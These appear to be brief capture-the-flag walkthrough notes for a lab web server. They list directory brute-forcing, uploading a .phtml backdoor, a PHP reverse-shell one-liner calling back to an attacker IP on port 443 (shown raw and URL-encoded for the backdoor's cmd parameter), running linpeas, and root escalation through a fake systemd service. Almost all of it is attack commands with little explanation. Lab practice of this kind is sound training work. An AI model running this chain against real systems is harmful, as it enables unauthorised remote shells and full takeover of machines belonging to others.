```zsh
python3 /root/dirsearch/dirsearch.py -u http://10.10.126.10:3333/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```


```zsh
python3 /root/dirsearch/dirsearch.py -u http://10.10.126.10:3333/ -t 16 -r -e r -R 3
```
/internal/ -File Upload
/internal/uploads/ -Execute your backdoor. Ext - .phtml


```zsh
 php -r '$sock=fsockopen("10.11.11.238",443);exec("/bin/sh -i <&3 >&3 2>&3");'

```
URL ENCODE THE ABOVE and run it with cmd
```
http://10.10.126.10:3333/internal/uploads/simple-backdoor.phtml?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.11.11.238%22%2C443)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27

```
Upload linpeas.sh, run it.

Made a fake service known as rooter.service
chmod 777 rooter.service

```bash
/bin/systemctl enable /tmp/rooter.service
```
```bash
/bin/systemctl start rooter
```